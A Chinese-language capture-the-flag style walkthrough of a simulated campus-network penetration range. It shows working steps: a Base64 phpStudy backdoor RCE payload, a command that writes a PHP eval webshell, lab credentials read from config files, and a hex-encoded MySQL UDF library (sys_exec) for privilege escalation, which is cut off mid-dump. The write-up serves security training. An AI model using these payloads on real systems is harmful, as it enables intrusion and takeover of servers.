# 一次校园网的渗透测试

[TOC]

## 一、靶场介绍

#### 1.场景介绍

本场景包含6个区域，分别是攻击网络、运维网络、行政楼、教学楼、服务网络和网站系统。
攻击网络包含Windows系统和Linux系统的攻击主机，内置渗透测试各个阶段使用的工具和脚本，辅助信息安全研究人员进行渗透攻击。
网站系统包含学校官方网站及对外开放的服务系统，靶标数量不少于3个。
服务网络负责提供学院内部日常教学和办公使用的相关服务，包括教务系统，一卡通等学校常用应用，靶标数量不少于4个。
教学楼网络负责日常教学使用的操作机，靶标数量不少于2个；
行政楼网络的主机主要用于教务及管理人员的日常办公，内含常用办公软件。
运维网络负责监测整个校园网络内主机的日常运行，同时对区域内的主机进行行为监管，保障主机系统安全。
本场景模拟校园网络环境，构建学校常用的服务与系统，在不同的应用服务中部署不同的漏洞点，通过对各个服务的漏洞挖掘与渗透测试，形成完整的利用链路，帮助学员掌握渗透测试过程中常用的工具，理解各个阶段中使用的不同技术，提升安全研究人员需要具备的综合能力。

#### 2.场景拓扑

![image-20221203171405111148-1671607416182854.png](http://192.168.79.239/ct/upload/other/f17cdc0c8bc4b951c59d75f3c52e3988.png)

#### 3.攻击路线

![image-20221204130604438543-1671607437922198.png](http://192.168.79.239/ct/upload/other/a35a9e5e15d766068ddf0d77a6fed28a.png)

#### 4.知识点

远程命令执行

phpstudy后门

文件包含漏洞

文件上传漏洞

弱密码

密码复用

任意用户登录

蚁剑工具使用

冰蝎工具使用

信息收集

流量代理

burpsuite使用

fscan使用

#### 5.CVE漏洞编号

CVE-2019-0232

#### 6.Att&ck框架指标/Shield防御指标

T1596-主动扫描

T1592-收集主机信息

T1190-利用面向公众的应用程序

T1202-间接命令执行

T1102-网络服务

T1132-数据编码

T1555-密码存储中的凭据

T1005-来自本地系统的数据

T1090-代理

T1572-协议隧道

T1082-文件和目录发现

T1078-有效账户

T1105-入口工具传输

T1110-暴力破解

T1022-远程服务

T1567-通过 Web 服务进行外泄

T1552-不安全的凭据

T1059-命令和脚本解释器

## 二、靶场题解

#### 阶段一：DMZ区渗透

##### 任务1：门户网站渗透（T1596-主动扫描、T1592-收集主机信息、T1190-利用面向公众的应用程序、T1202-间接命令执行）

```
本场景的第一个任务是对门户网站进行信息收集并验证漏洞是否存在。

通过fscan工具扫描目标端口信息并进行指纹识别，通过dirsearch工具扫描网站目录，通过burpsuite抓包来验证漏洞。fscan 是一个内网综合扫描工具，方便一键自动化、全方位漏洞扫描。它支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。

该任务可以通过以下操作完成。
```

已知目标地址`10.10.10.123`，进入`win10-tools`主机的`C:\Users\Administrator\Desktop\工具\内网渗透\端口扫描\fscan`目录

，在该目录地址栏输入cmd并回车启动命令行，执行命令进行端口扫描：

```
fscan.exe -h 10.10.10.123
```

![image-20221204133140853429-1671607440537684.png](http://192.168.79.239/ct/upload/other/bb0678ae7f6d99884694bb7994aab805.png)

发现可能存在phpstudy的后门rce，进入`C:\Users\Administrator\Desktop\工具\目录扫描\dirsearch`目录，启动命令行进行目录扫描：

```
python3 dirsearch.py -u http://10.10.10.123
```

![image-20221204140951433747-1671607442490882.png](http://192.168.79.239/ct/upload/other/a5cce6ba049e412a8ca8e0c68fdfbf35.png)

发现phpstudy的默认页面`phpinfo.php`和`phpMyAdmin`：

![image-20221212193645661810-1671607444266312.png](http://192.168.79.239/ct/upload/other/2952426787b1c0234a59dda1955ca061.png)

启动burp suite：

![image-20221212194025600241-1671607446060225.png](http://192.168.79.239/ct/upload/other/59465de3ca4a9b6005d924221d401279.png)

![image-20221212194122397583-1671607447771136.png](http://192.168.79.239/ct/upload/other/ef306237b7fa010fe2305d2a7f8e9653.png)

![image-20221204140238398201-1671607449566254.png](http://192.168.79.239/ct/upload/other/cf1812ef2678a2a2451690a339fa2442.png)

![image-20221214165820509699-1671607451334135.png](http://192.168.79.239/ct/upload/other/54793100b2073dd8c303565bbd6610eb.png)

启动谷歌浏览器：

![image-20221204140429629403-1671607453119391.png](http://192.168.79.239/ct/upload/other/a62d74360cb116c9d1f0ad7e0c0c1f59.png)

访问目标网站：

```
http://10.10.10.123
```

![image-20221204140458229351-1671607454902569.png](http://192.168.79.239/ct/upload/other/f869c8be9e5dfeac4145e4328e7e3a3b.png)

访问phpinfo页面：

```
http://10.10.10.123/phpinfo.php
```

![image-20221204141725827045-1671607456637732.png](http://192.168.79.239/ct/upload/other/e5715d34b5d0cf6285b334f4cca4eb3f.png)

设置浏览器代理:

![image-20221212193908736038-1671607458441573.png](http://192.168.79.239/ct/upload/other/6927582d303f3bd92b699977ea35583d.png)

回到burpsuite，点击`Proxy`，获取到GET请求数据包，右键空白处将该包发送给`Repeater`：

![image-20221204141942639853-1671607460152792.png](http://192.168.79.239/ct/upload/other/c3bd67f4da26769df575dfee88c98303.png)

点击`Decoder`进入编码解码模块：

![image-20221206162921485739-1671607461996262.png](http://192.168.79.239/ct/upload/other/b8d9b516f99e3391d02c1b73addfc2c5.png)

在右侧的`Encode as ...`>>`Base64`进行编码：

![image-20221204143122891926-1671607463833936.png](http://192.168.79.239/ct/upload/other/1a464eafccca481fd7adffb5b5006edb.png)

加密命令：

```
system('whoami');
```

![image-20221206163125285135-1671607465657770.png](http://192.168.79.239/ct/upload/other/313292f6d9f16cbbb6baed26e96f2dac.png)

```
c3lzdGVtKCd3aG9hbWknKTs=
```

点击`Repeater`，数据包中如下两处位置做修改，完成后点击`Send`：

```
Accept-charset: c3lzdGVtKCd3aG9hbWknKTs=

##插入Accept-charset头，内容为进行Base64编码后的将要执行的代码；

Accept-Encoding: gzip,deflate

##注意删除gzip,deflate之间的空格，否则不生效；
```

![image-20221204142206406202-1671607467433728.png](http://192.168.79.239/ct/upload/other/714d750adbb768a38eee2887e6a0bfe9.png)

成功验证存在后门，可以远程代码执行漏洞。

##### 任务2：webshell写入与管理（T1102-网络服务、T1132-数据编码、T1555-密码存储中的凭据）

```
本场景的第二个任务是利用后门写入webshell。

通过burpsuite工具更改数据包来执行命令及写入webshell，通过蚁剑工具连接webshell并进行管理。Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。

该任务可以通过以下操作完成。
```

加密`chdir`命令：

```
system('chdir');
```

![image-20221204143157936437-1671607469148672.png](http://192.168.79.239/ct/upload/other/2f32a5401e2f88fce96f0b7cfe7077f0.png)

```
c3lzdGVtKCdjaGRpcicpOw==
```

回到repeater模块，替换`Accept-charset`的内容后发送数据包：

![image-20221204143337323334-1671607470871375.png](http://192.168.79.239/ct/upload/other/7affa498ca391e295a20a0dbdaa9288a.png)

```
C:\phpStudy\PHPTutorial\Apache
```

加密`dir ..`命令：

```
system('dir ..');
```

![image-20221204143544203981-1671607472641924.png](http://192.168.79.239/ct/upload/other/ef1c2a5756479d9da5104d8141b49f19.png)

```
c3lzdGVtKCdkaXIgLi4nKTs=
```

repeater修改数据包后发送：

![image-20221204143654850461-1671607474319953.png](http://192.168.79.239/ct/upload/other/fd1559ca25682fe2a90e471af6a4216a.png)

```
C:\phpStudy\PHPTutorial\WWW\
```

获取到网站物理路径，构造写入webshell的命令并加密：

```
fputs(fopen('C:\phpStudy\PHPTutorial\WWW\shell.php','w'),'<?php @eval($_POST[pass]); ?>');
```

![image-20221204144449576104-1671607476050407.png](http://192.168.79.239/ct/upload/other/295157dc4d9a8f6f77282e48c2bfc6d2.png)

```
ZnB1dHMoZm9wZW4oJ0M6XHBocFN0dWR5XFBIUFR1dG9yaWFsXFdXV1xzaGVsbC5waHAnLCd3JyksJzw/cGhwIEBldmFsKCRfUE9TVFtwYXNzXSk7ID8+Jyk7
```

回到`Repeater`，修改并发送数据包：

![image-20221204144657163839-1671607477769191.png](http://192.168.79.239/ct/upload/other/9636b0cb64c8585a6658abfd050fa80c.png)

浏览器切换代理后访问shell路径：

```
http://10.10.10.123/shell.php
```

![image-20221213102518308319-1671607479464114.png](http://192.168.79.239/ct/upload/other/04abe2c17d92755d4aaa2684a0b62d51.png)

启动蚁剑工具：

![image-20221217144512632424-1671607481318112.png](http://192.168.79.239/ct/upload/other/88dd5591a417828393dd5ed565ae56af.png)

右击空白处点击`添加数据`，输入webshell信息，勾选`base64`：

```
URL地址：http://10.10.10.123/shell.php

连接密码：pass
```

![image-20221204145316962558-1671607482975124.png](http://192.168.79.239/ct/upload/other/fa287852ed9da624e3f7db50268fada1.png)

点击`测试连接`，成功后点击`添加`，添加数据：

![image-20221204145444312772-1671607484683278.png](http://192.168.79.239/ct/upload/other/860860ade0e1f7e574c34bd989370891.png)

shell添加成功：

![image-20221204145546083718-1671607486361638.png](http://192.168.79.239/ct/upload/other/a056f11588c6847260e33387c21a834d.png)



双击shell进入文件管理：

![image-20221204151309537764-1671607488140462.png](http://192.168.79.239/ct/upload/other/41e45b5554b44407de98e8e2d026bc02.png)

发现`flag.txt`文件，双击查看：

![image-20221208135637185333-1671607489788094.png](http://192.168.79.239/ct/upload/other/1d9ada7b739f0435f1ea1a4821cff4df.png)

```
flag{10F5-4B6E-7C58-944A-E56D-8191-B37F-9DBD}
```

![image-20221212180516200917-1671607491519775.png](http://192.168.79.239/ct/upload/other/68b08de64e46a9b459d20ced244dc7c4.png)

进入`C:/phpStudy/PHPTutorial/WWW/phpMyAdmin/libraries/`目录，发现数据库配置文件`config.default.php`：

![image-20221206164557060664-1671607493311366.png](http://192.168.79.239/ct/upload/other/1a111aaf7b19e62b47874b7df60c85c6.png)

在110行获取数据库地址：

![image-20221210102558641243-1671607494965915.png](http://192.168.79.239/ct/upload/other/5b87c50ce04649ae86acba723e94beb5.png)

```
192.168.11.223
```

在208和215行获取登录信息：

![image-20221204152231329770-1671607496823379.png](http://192.168.79.239/ct/upload/other/6603841bf517a75148ebdca8f1c08e5a.png)

```
user：root

password：iozRj0eB.
```

#### 阶段二：内网服务渗透

##### 任务3：数据库主机渗透（T1190-利用面向公众的应用程序、T1202-间接命令执行、T1005-来自本地系统的数据）

```
本场景的第3个任务是利用udf提权漏洞获得主机命令执行权限。

UDF（user defind function）用户自定义函数，通过添加新函数，对MySQL的功能进行扩充。调用方式与一般系统自带的函数相同，例如user()，version()等函数。udf 文件后缀在windows与linux系统下分别为dll与so，即动态链接库文件，由C、C++编写。

该任务可以通过以下操作完成。
```

使用蚁剑连接数据库：

![image-20221213110240685443-1671607499580403.png](http://192.168.79.239/ct/upload/other/f9a1d82ccf5bf90e49b4d59c1063cfbd.png)

点击`添加`：

![image-20221217145730303354-1671607501548768.png](http://192.168.79.239/ct/upload/other/da7635131583e8fc30e3d3e102e5a004.png)

连接信息如下：

![image-20221205092442716955-1671607503232341.png](http://192.168.79.239/ct/upload/other/52a823b1da561599c5af7338fe72f7b7.png)

点击`测试连接`，连接成功后点击`添加`：

![image-20221205092546731716-1671607504890002.png](http://192.168.79.239/ct/upload/other/7ea3a72836227462177c06f48d535669.png)

![image-20221205092838896115-1671607506467867.png](http://192.168.79.239/ct/upload/other/810d4a11bfd06dec71ff4c768221a539.png)

![image-20221205092907651050-1671607508184487.png](http://192.168.79.239/ct/upload/other/0a261914743c6006f00435c9d843fd91.png)

双击展开数据库连接后，选中任意数据库，执行SQL语句验证是否连接正常：

```
show databases;
```

![image-20221213110830726478-1671607509773148.png](http://192.168.79.239/ct/upload/other/9801ef6e7436d409b9c9311ca7758887.png)



查看`plugin_dir`，获得数据库插件的物理路径：

```
show variables like "%plugin%";
```

![image-20221205094511700565-1671607511384704.png](http://192.168.79.239/ct/upload/other/509869ed367d46f34b8b47bf8f1f95fd.png)

```
/usr/lib64/mysql/plugin/
```

查看是否满足udf提权条件：

```
show variables like "%secure_file%";
```

![image-20221205094600739502-1671607512954123.png](http://192.168.79.239/ct/upload/other/efd3af75f7dee8b4a686f86429b88d9f.png)

`secure_file_priv`值为空，可以进行udf提权；

将udf十六进制导入为`udf.so`并写入`plugin_dir`目录中；执行下方代码块的内容：

```
select unhex('7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F61757800